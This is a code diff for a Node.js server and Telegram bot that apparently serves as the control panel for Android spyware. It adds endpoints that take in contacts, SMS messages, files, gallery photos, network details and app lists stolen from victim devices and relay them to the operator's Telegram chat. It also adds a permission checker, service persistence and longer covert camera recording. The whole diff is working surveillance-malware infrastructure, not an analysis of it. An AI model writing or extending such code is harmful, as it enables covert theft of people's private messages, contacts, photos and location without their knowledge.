@@ -27,6 +27,7 @@ const app    = express();
 const upload = multer({ dest: "/tmp" });
 const PORT   = process.env.PORT || 3000;
 app.use(express.json());
+app.use(express.text());
 
 const bot = new TelegramBot(BOT_TOKEN);
 bot.setWebHook(`${BASE_URL}/bot/${BOT_TOKEN}`);
@@ -37,6 +38,7 @@ const userSessions = new Map();  // chatId -> {key, selectedDevice, lastActivity
 const awaitingAuth = new Map();  // chatId -> {messageId, timestamp}
 const awaitingCustom = new Map(); // chatId -> {label, promptId, device}
 const activeOperations = new Map(); // chatId -> {type, startTime, device}
+const permissionRequests = new Map(); // chatId -> {deviceId, permission}
 
 /* ── Helpers ────────────────────────────────────── */
 const enc    = s => Buffer.from(s).toString("base64url");
@@ -51,7 +53,8 @@ const progressAnimations = {
   files: ["📂", "📁", "🗂️", "📂"],
   gallery: ["🖼️", "🎨", "📸", "✨"],
   contacts: ["📱", "👥", "📋", "✅"],
-  sms: ["💬", "📨", "✉️", "✅"]
+  sms: ["💬", "📨", "✉️", "✅"],
+  permission: ["🔐", "⚙️", "🔧", "✅"]
 };
 
 const loadingFrames = [
@@ -99,7 +102,8 @@ async function getDevices(key) {
     lastSeen: data.info?.time || 0,
     online: Date.now() - (data.info?.time || 0) < 5 * 60 * 1000,
     battery: data.info?.battery || -1,
-    storage: data.info?.storage || {}
+    storage: data.info?.storage || {},
+    permissions: data.info?.permissions || {}
   }));
 }
 
@@ -155,7 +159,9 @@ bot.onText(/\/start/, async (msg) => {
                 "🔐 *Security Features:*\n" +
                 "• End-to-end encrypted connection\n" +
                 "• Multi-device management\n" +
-                "• Real-time status monitoring\n\n" +
+                "• Real-time status monitoring\n" +
+                "• Background service persistence\n" +
+                "• Permission management\n\n" +
                 "_Click below to authenticate_",
         parse_mode: 'Markdown',
         reply_markup: loginKeyboard
@@ -229,7 +235,8 @@ function getMainMenu(includeBack = false) {
       ],
       [{text:"📍 Location Services", callback_data:"location_menu"}],
       [{text:"📊 Data Extraction", callback_data:"data_menu"}],
-      [{text:"⚙️ Device Controls", callback_data:"device_menu"}]
+      [{text:"⚙️ Device Controls", callback_data:"device_menu"}],
+      [{text:"🔐 Permissions Check", callback_data:"check_permissions"}]
     ]
   };
   
@@ -272,6 +279,16 @@ const getDataMenu = () => ({
   ]
 });
 
+const getDeviceMenu = () => ({
+  inline_keyboard: [
+    [{text: "🔋 Battery Status", callback_data: "battery_status"}],
+    [{text: "📶 Network Info", callback_data: "network_info"}],
+    [{text: "📱 App List", callback_data: "app_list"}],
+    [{text: "🔄 Restart Services", callback_data: "restart_services"}],
+    [{text: "🔙 Back", callback_data: "main_menu"}]
+  ]
+});
+
 /* ── Gallery with Thumbnails ────────────────────── */
 const gallery = ["whatsapp","screenshots","snapchat","camera","instagram","downloads","telegram","all"];
 const getGalleryKeyboard = (includeBack = true) => {
@@ -309,15 +326,15 @@ bot.on("callback_query", async q => {
     /* ── Login Flow ─────────────────────────────── */
     if (data === "login_start") {
       await bot.answerCallbackQuery(id);
-const prompt = await bot.sendMessage(chatId,
-  "*🔑 Authentication Required*\n\n" +
-  "Please enter your access key:\n\n" +
-  "💡 _The key is in your app's_ `secret_key.txt` _file_",
-  { 
-    parse_mode: 'Markdown',
-    reply_markup: { force_reply: true }
-  }
-);
+      const prompt = await bot.sendMessage(chatId,
+        "*🔑 Authentication Required*\n\n" +
+        "Please enter your access key:\n\n" +
+        "💡 _The key is in your app's_ `secret_key.txt` _file_",
+        { 
+          parse_mode: 'Markdown',
+          reply_markup: { force_reply: true }
+        }
+      );
       awaitingAuth.set(chatId, {
         messageId: prompt.message_id,
         timestamp: Date.now()
@@ -355,6 +372,39 @@ const prompt = await bot.sendMessage(chatId,
         reply_markup: {
           inline_keyboard: [[{text: "🔙 Back", callback_data: "device_list"}]]
         }
+      });
+      return;
+    }
+    
+    /* ── Device Menu Navigation ─────────────────── */
+    if (data === "device_menu") {
+      await bot.answerCallbackQuery(id);
+      await bot.editMessageText(
+        "*⚙️ Device Controls*\n\n" +
+        "Advanced device management options:",
+        {
+          chat_id: chatId,
+          message_id: msgId,
+          parse_mode: 'Markdown',
+          reply_markup: getDeviceMenu()
+        }
+      );
+      return;
+    }
+    
+    /* ── Permission Checker ─────────────────────── */
+    if (data === "check_permissions") {
+      await bot.answerCallbackQuery(id, { text: "Checking permissions..." });
+      const session = userSessions.get(chatId);
+      if (!session || !session.selectedDevice) return;
+      
+      await showAnimatedLoading(chatId, msgId, "permission", 2000);
+      
+      await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
+        command: "check_permissions",
+        chat: chatId,
+        msg: msgId,
+        ts: Date.now()
       });
       return;
     }
@@ -480,7 +530,7 @@ const prompt = await bot.sendMessage(chatId,
         `*${emoji} ${side} Camera*\n\n` +
         "Select action:\n\n" +
         "_Photos are captured in high quality_\n" +
-        "_Videos support up to 2 minutes recording_",
+        "_Videos support up to 5 minutes recording_",
         {
           chat_id: chatId,
           message_id: msgId,
@@ -547,7 +597,13 @@ const prompt = await bot.sendMessage(chatId,
       // Files
       "file_root": { type: "files", msg: "📂 Loading file explorer..." },
       "file_quick": { type: "files", msg: "⚡ Loading quick access..." },
-      "file_storage": { type: "files", msg: "💾 Calculating storage..." }
+      "file_storage": { type: "files", msg: "💾 Calculating storage..." },
+      
+      // Device
+      "battery_status": { type: "default", msg: "🔋 Getting battery status..." },
+      "network_info": { type: "default", msg: "📶 Getting network info..." },
+      "app_list": { type: "default", msg: "📱 Getting app list..." },
+      "restart_services": { type: "default", msg: "🔄 Restarting services..." }
     };
     
     // Check if it's a direct command
@@ -719,7 +775,7 @@ bot.on("message", async m => {
         {
           caption: "*❌ Authentication Failed*\n\n" +
                   "The access key is invalid.\n\n" +
-                  "_Please check your secret\\_key.txt file_\n\n" +  // FIXED: Escaped underscore
+                  "_Please check your secret\\_key.txt file_\n\n" +
                   "Use /start to try again.",
           parse_mode: 'Markdown'
         }
@@ -943,7 +999,120 @@ app.post("/json/location", express.json(), async (req, res) => {
   }
 });
 
-/* 4) Enhanced file listing */
+/* 4) Text data endpoints - FIXED */
+app.post("/text/contacts", express.text(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+    
+    const sessions = getActiveSessions(deviceInfo.key);
+    const contactData = req.body;
+    
+    for (const {chatId} of sessions) {
+      try {
+        // Split into chunks if too large
+        const maxLength = 4000;
+        if (contactData.length > maxLength) {
+          const chunks = contactData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
+          for (let i = 0; i < chunks.length; i++) {
+            await bot.sendMessage(chatId, 
+              `📱 *Contacts Export (Part ${i + 1}/${chunks.length})*\n\n` +
+              `\`\`\`\n${chunks[i]}\n\`\`\``,
+              { parse_mode: 'Markdown' }
+            );
+          }
+        } else {
+          await bot.sendMessage(chatId,
+            `📱 *Contacts Export*\n\n` +
+            `\`\`\`\n${contactData}\n\`\`\``,
+            { parse_mode: 'Markdown' }
+          );
+        }
+      } catch (e) {
+        console.error(`Contacts send error:`, e.message);
+      }
+    }
+    
+    res.json({ok: true});
+  } catch (error) {
+    res.status(500).json({error: error.message});
+  }
+});
+
+app.post("/text/sms", express.text(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+    
+    const sessions = getActiveSessions(deviceInfo.key);
+    const smsData = req.body;
+    
+    for (const {chatId} of sessions) {
+      try {
+        // Split into chunks if too large
+        const maxLength = 4000;
+        if (smsData.length > maxLength) {
+          const chunks = smsData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
+          for (let i = 0; i < chunks.length; i++) {
+            await bot.sendMessage(chatId, 
+              `💬 *SMS Export (Part ${i + 1}/${chunks.length})*\n\n` +
+              `\`\`\`\n${chunks[i]}\n\`\`\``,
+              { parse_mode: 'Markdown' }
+            );
+          }
+        } else {
+          await bot.sendMessage(chatId,
+            `💬 *SMS Export*\n\n` +
+            `\`\`\`\n${smsData}\n\`\`\``,
+            { parse_mode: 'Markdown' }
+          );
+        }
+      } catch (e) {
+        console.error(`SMS send error:`, e.message);
+      }
+    }
+    
+    res.json({ok: true});
+  } catch (error) {
+    res.status(500).json({error: error.message});
+  }
+});
+
+/* 5) File upload endpoint - FIXED */
+app.post("/file", upload.single("blob"), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+    
+    const sessions = getActiveSessions(deviceInfo.key);
+    const {name, size, modified} = req.body;
+    
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendDocument(chatId, fs.readFileSync(req.file.path), {
+          caption: `📄 *File Downloaded*\n\n` +
+                  `Name: ${name}\n` +
+                  `Size: ${size}\n` +
+                  `Modified: ${modified}\n` +
+                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
+          parse_mode: 'Markdown'
+        }, {
+          filename: name
+        });
+      } catch (e) {
+        console.error(`File send error:`, e.message);
+      }
+    }
+    
+    res.json({ok: true});
+  } catch (error) {
+    res.status(500).json({error: error.message});
+  } finally {
+    if (req.file) fs.unlinkSync(req.file.path);
+  }
+});
+
+/* 6) Enhanced file listing */
 app.post("/json/filelist", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
@@ -1024,7 +1193,7 @@ app.post("/json/filelist", express.json(), async (req, res) => {
   }
 });
 
-/* 5) Storage info display */
+/* 7) Storage info display */
 app.post("/json/storage_info", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
@@ -1063,7 +1232,7 @@ app.post("/json/storage_info", express.json(), async (req, res) => {
   }
 });
 
-/* 6) Gallery count with preview */
+/* 8) Gallery count with preview */
 app.post("/json/gallerycount", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
@@ -1111,7 +1280,7 @@ app.post("/json/gallerycount", express.json(), async (req, res) => {
   }
 });
 
-/* 7) Gallery photo with progress */
+/* 9) Gallery photo with progress */
 app.post("/gallery/photo", upload.single("img"), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
@@ -1142,13 +1311,13 @@ app.post("/gallery/photo", upload.single("img"), async (req, res) => {
   }
 });
 
-/* 8) Status updates */
+/* 10) Status updates */
 app.post("/json/gallery_status", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
     if (!deviceInfo) return res.sendStatus(403);
     
-    const {chat_id, type, message, count, folder} = req.body;
+    const {chat_id, type, message, count, folder, error} = req.body;
     
     if (type === "upload_complete") {
       await bot.sendMessage(chat_id,
@@ -1159,7 +1328,12 @@ app.post("/json/gallery_status", express.json(), async (req, res) => {
       );
     } else if (type === "error") {
       await bot.sendMessage(chat_id,
-        `❌ *Error*\n\n${message}`,
+        `❌ *Error*\n\n${error}`,
+        { parse_mode: 'Markdown' }
+      );
+    } else if (type === "status") {
+      await bot.sendMessage(chat_id,
+        `ℹ️ *Status Update*\n\n${message}`,
         { parse_mode: 'Markdown' }
       );
     }
@@ -1170,171 +1344,118 @@ app.post("/json/gallery_status", express.json(), async (req, res) => {
   }
 });
 
-/* ── Missing data endpoints ─────────────────────── */
-
-// Contacts dump
-app.post("/json/contacts", express.text({ type: '*/*' }), async (req, res) => {
+/* 11) File status endpoint */
+app.post("/json/file_status", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
     if (!deviceInfo) return res.sendStatus(403);
-
-    const sessions = getActiveSessions(deviceInfo.key);
-    const tmp = `/tmp/contacts_${Date.now()}.txt`;
-    fs.writeFileSync(tmp, req.body);
-
-    for (const {chatId} of sessions) {
-      try {
-        await bot.sendDocument(chatId, tmp, {
-          caption: `📱 *Contacts Dump*\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\``,
-          parse_mode: 'Markdown'
-        });
-      } catch (e) {
-        console.error('Contacts send error:', e.message);
-      }
+    
+    const {chat_id, type, message, error} = req.body;
+    
+    if (type === "error") {
+      await bot.sendMessage(chat_id,
+        `❌ *File Operation Error*\n\n${error}`,
+        { parse_mode: 'Markdown' }
+      );
+    } else if (type === "status") {
+      await bot.sendMessage(chat_id,
+        `ℹ️ ${message}`,
+        { parse_mode: 'Markdown' }
+      );
     }
-
-    fs.unlinkSync(tmp);
+    
     res.json({ok: true});
   } catch (error) {
-    console.error('Contacts error:', error);
     res.status(500).json({error: error.message});
   }
 });
 
-// SMS dump
-app.post("/json/sms", express.text({ type: '*/*' }), async (req, res) => {
-  try {
-    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
-    if (!deviceInfo) return res.sendStatus(403);
-
-    const sessions = getActiveSessions(deviceInfo.key);
-    const tmp = `/tmp/sms_${Date.now()}.txt`;
-    fs.writeFileSync(tmp, req.body);
-
-    for (const {chatId} of sessions) {
-      try {
-        await bot.sendDocument(chatId, tmp, {
-          caption: `💬 *SMS Dump*\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\``,
-          parse_mode: 'Markdown'
-        });
-      } catch (e) {
-        console.error('SMS send error:', e.message);
-      }
-    }
-
-    fs.unlinkSync(tmp);
-    res.json({ok: true});
-  } catch (error) {
-    console.error('SMS error:', error);
-    res.status(500).json({error: error.message});
-  }
-});
-
-// Device info
-app.post("/json/device_info", express.json(), async (req, res) => {
-  try {
-    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
-    if (!deviceInfo) return res.sendStatus(403);
-
-    const sessions = getActiveSessions(deviceInfo.key);
-    const info = JSON.stringify(req.body, null, 2);
-
-    for (const {chatId} of sessions) {
-      try {
-        await bot.sendMessage(
-          chatId,
-          `📊 *Device Info*\n\n\`\`\`\n${info}\n\`\`\``,
-          { parse_mode: 'Markdown' }
-        );
-      } catch (e) {
-        console.error('Device info send error:', e.message);
-      }
-    }
-
-    res.json({ok: true});
-  } catch (error) {
-    console.error('Device info error:', error);
-    res.status(500).json({error: error.message});
-  }
-});
-
-// Generic status messages
+/* 12) JSON status/error endpoints */
 app.post("/json/status", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
     if (!deviceInfo) return res.sendStatus(403);
-
+    
     const sessions = getActiveSessions(deviceInfo.key);
     const {status} = req.body;
-
+    
     for (const {chatId} of sessions) {
-      try {
-        await bot.sendMessage(chatId, `ℹ️ *Status:* ${status}`, { parse_mode: 'Markdown' });
-      } catch (e) {
-        console.error('Status send error:', e.message);
-      }
+      await bot.sendMessage(chatId,
+        `ℹ️ *Status Update*\n\n${status}`,
+        { parse_mode: 'Markdown' }
+      );
     }
-
+    
     res.json({ok: true});
   } catch (error) {
-    console.error('Status error:', error);
     res.status(500).json({error: error.message});
   }
 });
 
-// Error messages
 app.post("/json/error", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
     if (!deviceInfo) return res.sendStatus(403);
-
+    
     const sessions = getActiveSessions(deviceInfo.key);
-    const {error: errMsg} = req.body;
-
+    const {error} = req.body;
+    
     for (const {chatId} of sessions) {
-      try {
-        await bot.sendMessage(chatId, `❌ *Error:* ${errMsg}`, { parse_mode: 'Markdown' });
-      } catch (e) {
-        console.error('Error send error:', e.message);
-      }
+      await bot.sendMessage(chatId,
+        `❌ *Error*\n\n${error}`,
+        { parse_mode: 'Markdown' }
+      );
     }
-
+    
     res.json({ok: true});
   } catch (error) {
-    console.error('Error endpoint:', error);
     res.status(500).json({error: error.message});
   }
 });
 
-// File uploads
-app.post("/upload", upload.single("blob"), async (req, res) => {
+/* 13) Permission checker response */
+app.post("/json/permissions", express.json(), async (req, res) => {
   try {
     const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
     if (!deviceInfo) return res.sendStatus(403);
-
-    const sessions = getActiveSessions(deviceInfo.key);
-    const {name, size, modified} = req.body;
-
-    for (const {chatId} of sessions) {
-      try {
-        await bot.sendDocument(chatId, fs.readFileSync(req.file.path), {
-          filename: name,
-          caption: `📂 *File Received*\nName: ${name}\nSize: ${size}\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\`\nModified: ${modified}`,
-          parse_mode: 'Markdown'
-        });
-      } catch (e) {
-        console.error('File upload error:', e.message);
+    
+    const {chat_id, msg_id, permissions} = req.body;
+    
+    let message = "*🔐 Permission Status*\n\n";
+    
+    const permissionEmojis = {
+      camera: "📸",
+      location: "📍",
+      contacts: "📱",
+      sms: "💬",
+      storage: "📂",
+      phone: "📞",
+      microphone: "🎤"
+    };
+    
+    Object.entries(permissions).forEach(([perm, granted]) => {
+      const emoji = permissionEmojis[perm] || "❓";
+      const status = granted ? "✅ Granted" : "❌ Denied";
+      message += `${emoji} ${perm}: ${status}\n`;
+    });
+    
+    message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
+    
+    await bot.editMessageText(message, {
+      chat_id,
+      message_id: msg_id,
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{text: "🔄 Refresh", callback_data: "check_permissions"}],
+          [{text: "🔙 Back", callback_data: "main_menu"}]
+        ]
       }
-    }
-
+    });
+    
     res.json({ok: true});
   } catch (error) {
-    console.error('Upload endpoint error:', error);
     res.status(500).json({error: error.message});
-  } finally {
-    if (req.file && fs.existsSync(req.file.path)) {
-      fs.unlinkSync(req.file.path);
-    }
   }
 });
 
@@ -1344,6 +1465,125 @@ function formatFileSize(bytes) {
   if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
   if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
   return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
+}
+
+/* 14) Device Status endpoints */
+app.post("/json/device_status", express.json(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+    
+    const {chat_id, msg_id, type} = req.body;
+    
+    if (type === "battery_status") {
+      const {battery} = req.body;
+      
+      // Create battery visual
+      const batteryBar = getBatteryVisual(battery.percentage);
+      
+      await bot.editMessageText(
+        `*🔋 Battery Status*\n\n` +
+        `${batteryBar}\n\n` +
+        `📊 *Level:* ${battery.percentage}%\n` +
+        `⚡ *Status:* ${battery.status}\n` +
+        `🔌 *Power Source:* ${battery.power_source}\n` +
+        `🌡️ *Temperature:* ${battery.temperature}\n` +
+        `⚡ *Voltage:* ${battery.voltage}\n\n` +
+        `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
+        {
+          chat_id,
+          message_id: msg_id,
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [[
+              {text: "🔄 Refresh", callback_data: "battery_status"},
+              {text: "🔙 Back", callback_data: "device_menu"}
+            ]]
+          }
+        }
+      );
+    }
+    else if (type === "network_info") {
+      const {network} = req.body;
+      
+      let message = `*📶 Network Information*\n\n`;
+      message += `📡 *Connected:* ${network.connected ? '✅ Yes' : '❌ No'}\n`;
+      message += `📊 *Type:* ${network.type}\n\n`;
+      
+      if (network.wifi) {
+        message += `*WiFi Details:*\n`;
+        message += `📡 *SSID:* ${network.wifi.ssid}\n`;
+        message += `📶 *Signal:* ${network.wifi.signal_strength}\n`;
+        message += `⚡ *Speed:* ${network.wifi.link_speed}\n`;
+        message += `🌐 *IP:* \`${network.wifi.ip_address}\`\n`;
+      }
+      
+      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
+      
+      await bot.editMessageText(message, {
+        chat_id,
+        message_id: msg_id,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[
+            {text: "🔄 Refresh", callback_data: "network_info"},
+            {text: "🔙 Back", callback_data: "device_menu"}
+          ]]
+        }
+      });
+    }
+    else if (type === "app_list") {
+      const {total, apps} = req.body;
+      
+      let message = `*📱 Installed Applications*\n\n`;
+      message += `Total: *${total}* apps\n`;
+      message += `Showing: First 100\n\n`;
+      
+      // Group by system/user apps
+      const userApps = apps.filter(app => !app.system);
+      const systemApps = apps.filter(app => app.system);
+      
+      message += `*User Apps (${userApps.length}):*\n`;
+      userApps.slice(0, 10).forEach(app => {
+        message += `• ${app.name}\n`;
+      });
+      if (userApps.length > 10) {
+        message += `_... and ${userApps.length - 10} more_\n`;
+      }
+      
+      message += `\n*System Apps:* ${systemApps.length}\n`;
+      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
+      
+      await bot.editMessageText(message, {
+        chat_id,
+        message_id: msg_id,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[
+            {text: "🔄 Refresh", callback_data: "app_list"},
+            {text: "🔙 Back", callback_data: "device_menu"}
+          ]]
+        }
+      });
+    }
+    
+    res.json({ok: true});
+  } catch (error) {
+    res.status(500).json({error: error.message});
+  }
+});
+
+/* ── Helper function for battery visual ────────── */
+function getBatteryVisual(percentage) {
+  const level = Math.floor(percentage / 10);
+  const filled = '█'.repeat(level);
+  const empty = '░'.repeat(10 - level);
+  
+  let emoji = '🔋';
+  if (percentage <= 20) emoji = '🪫';
+  else if (percentage >= 80) emoji = '🔋';
+  
+  return `${emoji} [${filled}${empty}] ${percentage}%`;
 }
 
 /* ── Error Handler ──────────────────────────────── */
